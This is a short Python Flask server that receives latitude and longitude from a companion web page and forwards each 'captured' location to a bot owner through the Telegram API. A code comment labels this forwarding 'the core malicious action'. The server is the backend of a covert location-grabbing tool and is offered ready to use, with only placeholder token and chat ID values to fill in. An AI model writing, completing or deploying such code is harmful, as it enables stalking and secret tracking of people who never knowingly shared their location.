from flask import Flask, request, jsonify
from flask_cors import CORS
import requests # Used if you need to call external APIs, but here we use it for simplicity

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE"
# The Chat ID where the bot should send the location data (usually the owner's ID)
OWNER_CHAT_ID = "YOUR_OWNER_CHAT_ID_HERE" 
# ---------------------

app = Flask(__name__)
CORS(app) # Allows the HTML page to be served from a different origin

# Function to send message to Telegram Bot
def send_to_telegram(lat, lon):
    """Sends the location data to the bot owner via Telegram API."""
    import telegram
    
    try:
        bot = telegram.Bot(token=TELEGRAM_BOT_TOKEN)
        
        # Construct a nice message for the owner
        message_text = f"📍 **New Location Captured!**\n\nLatitude: {lat}\nLongitude: {lon}"
        
        bot.send_message(
            chat_id=OWNER_CHAT_ID, 
            text=message_text, 
            parse_mode='Markdown'
        )
        print(f"Successfully sent location to Telegram: {lat}, {lon}")
    except Exception as e:
        print(f"Error sending message to Telegram: {e}")

@app.route('/submit_location', methods=['POST'])
def submit_location():
    """Receives latitude and longitude from the frontend."""
    data = request.get_json()
    
    if not data or 'lat' not in data or 'lon' not in data:
        return jsonify({"status": "error", "message": "Missing latitude or longitude"}), 400

    latitude = data['lat']
    longitude = data['lon']
    
    # 1. Process the data (The core malicious action)
    send_to_telegram(latitude, longitude)
    
    # 2. Return success to the frontend so it knows the job is done
    return jsonify({"status": "success", "message": "Location received"})

if __name__ == '__main__':
    # Run the server. If you put the HTML locally, use 0.0.0.0 to make it accessible from the phone/client.
    app.run(host='0.0.0.0', port=5000, debug=True)
